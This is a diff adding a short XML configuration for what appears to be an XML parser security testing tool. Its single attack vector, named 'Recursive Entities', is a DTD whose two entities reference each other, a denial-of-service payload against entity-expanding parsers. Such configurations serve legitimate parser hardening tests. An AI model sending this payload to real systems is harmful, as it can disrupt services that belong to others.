@@ -1,0 +1,20 @@
+<config>
+<name>Recursive Entities</name>
+<description></description>
+<params>
+    <dosbox>false</dosbox>
+    <targetFile>false</targetFile>
+    <helperURL>false</helperURL>
+    <attackListenerURL>false</attackListenerURL>
+    <externalResources>false</externalResources>
+</params>
+<attackvectors>
+<attackvector>
+<directMessage><![CDATA[<!DOCTYPE data [
+<!ENTITY a "a&b;" >
+<!ENTITY b "&a;" >
+]>
+<data>&a;</data>]]></directMessage>
+</attackvector>
+</attackvectors>
+</config>
